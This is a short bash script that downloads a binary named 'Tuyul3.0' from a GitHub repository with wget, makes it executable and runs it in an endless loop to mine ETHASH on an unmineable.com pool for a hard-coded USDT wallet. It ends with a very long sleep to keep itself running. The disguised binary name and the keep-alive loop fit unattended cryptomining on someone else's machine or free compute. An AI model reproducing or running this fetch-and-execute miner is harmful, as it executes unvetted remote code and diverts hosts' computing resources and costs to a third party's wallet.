#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=USDT:TJ5k9pQtZ7TMa2EAX41k8TzDSkhRrxuKD1
WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#dub9-ojae)
wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
